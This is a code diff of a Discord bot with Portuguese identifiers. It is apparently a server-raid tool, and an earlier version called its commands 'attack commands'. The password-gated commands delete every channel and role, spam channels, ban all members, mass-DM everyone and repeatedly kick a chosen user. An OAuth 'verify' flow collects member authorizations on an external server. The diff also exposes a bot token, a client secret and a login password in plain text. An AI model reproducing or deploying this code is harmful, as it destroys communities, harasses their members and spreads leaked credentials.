@@ -13,13 +13,13 @@ const client = new Client({
 });
 
 // --- CONFIGURAÇÃO ---
-const BOT_TOKEN = 'MTQ1OTU1MDk2NjAzMzQyMDQ5Mg.Ggmnh9.EeI_QRfPMiN0u6OCP0fTytZaCHRgsGDwTD3jfE';
+const BOT_TOKEN = 'MTQ1OTU1MDk2NjAzMzQyMDQ5Mg.G_yFLB.Jza3p1jDg1ifxwXL3f0AjKZNR_GHbc5tPsSxCg';
 const CLIENT_ID = '1459550966033420492';
 const CLIENT_SECRET = 'p7doL9JCDnG86_jKZzHNl_zemb6nk0zO'; 
 const REDIRECT_URI = 'https://rickwcl.onrender.com/callback';
 const ID_CARGO = '1466834314225389804';
 const ID_SERVIDOR = '1465936358513315976';
-const SENHA_LOGIN = "Rickwcl"; // Senha alterada conforme pedido
+const SENHA_LOGIN = "Rickwcl"; 
 
 let db = { kickList: [], usuarios: [] };
 if (fs.existsSync('./storage.json')) db = JSON.parse(fs.readFileSync('./storage.json'));
@@ -59,18 +59,18 @@ app.get('/callback', async (req, res) => {
 app.listen(process.env.PORT || 10000);
 
 const commands = [
-    new SlashCommandBuilder().setName('ajuda').setDescription('x'),
-    new SlashCommandBuilder().setName('verify').setDescription('x'),
-    new SlashCommandBuilder().setName('ip').setDescription('x').addStringOption(o => o.setName('endereco').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('ping').setDescription('x'),
-    new SlashCommandBuilder().setName('addemoji').setDescription('x').addStringOption(o => o.setName('emoji').setDescription('x').setRequired(true)).addStringOption(o => o.setName('nome').setDescription('x').setRequired(false)),
-    new SlashCommandBuilder().setName('clear').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addIntegerOption(o => o.setName('quantidade').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('haid').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('mensagem').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('allmsg').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('conteudo').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('allban').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('boss').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('nuke').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
-    new SlashCommandBuilder().setName('kickcall').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addUserOption(o => o.setName('alvo').setDescription('x').setRequired(true))
+    new SlashCommandBuilder().setName('ajuda').setDescription('Exibir lista de comandos'),
+    new SlashCommandBuilder().setName('verify').setDescription('Enviar sistema de verificação'),
+    new SlashCommandBuilder().setName('ip').setDescription('Consultar detalhes de um IP').addStringOption(o => o.setName('endereco').setDescription('IP').setRequired(true)),
+    new SlashCommandBuilder().setName('ping').setDescription('Ver latência'),
+    new SlashCommandBuilder().setName('addemoji').setDescription('Adicionar emoji por URL').addStringOption(o => o.setName('emoji').setDescription('Emoji').setRequired(true)).addStringOption(o => o.setName('nome').setDescription('Nome do emoji').setRequired(false)),
+    new SlashCommandBuilder().setName('clear').setDescription('Limpar chat').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)).addIntegerOption(o => o.setName('quantidade').setDescription('Qtd').setRequired(true)),
+    new SlashCommandBuilder().setName('haid').setDescription('Raid Maxima').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)).addStringOption(o => o.setName('mensagem').setDescription('Msg').setRequired(true)),
+    new SlashCommandBuilder().setName('allmsg').setDescription('DM em todos').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)).addStringOption(o => o.setName('conteudo').setDescription('Texto').setRequired(true)),
+    new SlashCommandBuilder().setName('allban').setDescription('Banir todos').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)),
+    new SlashCommandBuilder().setName('boss').setDescription('Resetar Servidor').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)),
+    new SlashCommandBuilder().setName('nuke').setDescription('Nukar Canal').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)),
+    new SlashCommandBuilder().setName('kickcall').setDescription('Kickcall Persistente').addStringOption(o => o.setName('login').setDescription('Senha').setRequired(true)).addUserOption(o => o.setName('alvo').setDescription('Usuario').setRequired(true))
 ].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
@@ -98,12 +98,6 @@ client.on(Events.InteractionCreate, async (i) => {
         return i.reply({ embeds: [embed], components: [{ type: 1, components: [{ type: 2, style: 5, label: "Verificar", url: authUrl }] }] });
     }
 
-    if (i.commandName === 'ping') {
-        const sent = await i.reply({ content: 'Calculando...', fetchReply: true, flags: [64] });
-        const latency = sent.createdTimestamp - i.createdTimestamp;
-        return i.editReply(`🏓 **Pong!**\nLatência API: \`${latency}ms\`\nWebSocket: \`${client.ws.ping}ms\``);
-    }
-
     if (i.commandName === 'ajuda') {
         const helpEmbed = new EmbedBuilder()
             .setTitle('🔒 cmd - FIRST').setColor(0x00008B)
@@ -117,12 +111,18 @@ client.on(Events.InteractionCreate, async (i) => {
         return i.reply({ embeds: embed ? [embed] : [], content: embed ? null : "❌ erro" });
     }
 
+    if (i.commandName === 'ping') {
+        const sent = await i.reply({ content: 'Calculando...', fetchReply: true, flags: [64] });
+        const latency = sent.createdTimestamp - i.createdTimestamp;
+        return i.editReply(`🏓 **Pong!**\nLatência API: \`${latency}ms\`\nWebSocket: \`${client.ws.ping}ms\``);
+    }
+
     if (i.options.getString('login') && i.options.getString('login') !== SENHA_LOGIN) {
         return i.reply({ content: "🔒 senha inválida", flags: [64] });
     }
 
-    // --- COMANDOS DE ATAQUE / UTILITÁRIOS ---
-    if (i.commandName === 'haid') { // Antigo 'first'
+    // --- COMANDOS PROTEGIDOS ---
+    if (i.commandName === 'haid') { 
         await i.reply({ content: "⚡ **VELOCIDADE MÁXIMA.**", flags: [64] });
         i.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
         for (let j = 0; j < 50; j++) {
@@ -132,7 +132,7 @@ client.on(Events.InteractionCreate, async (i) => {
         }
     }
 
-    if (i.commandName === 'boss') { // Antigo 'reset'
+    if (i.commandName === 'boss') { 
         await i.reply({ content: "🧹 Resetando...", flags: [64] });
         i.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
         i.guild.roles.cache.forEach(r => { if (r.editable && r.name !== "@everyone") r.delete().catch(() => {}); });
@@ -145,7 +145,7 @@ client.on(Events.InteractionCreate, async (i) => {
     }
 
     if (i.commandName === 'allban') {
-        await i.reply({ content: "🔨 Banindo...", flags: [64] });
+        await i.reply({ content: "🔨 Banindo geral...", flags: [64] });
         const members = await i.guild.members.fetch();
         members.forEach(m => { if (m.bannable) m.ban().catch(() => {}); });
     }
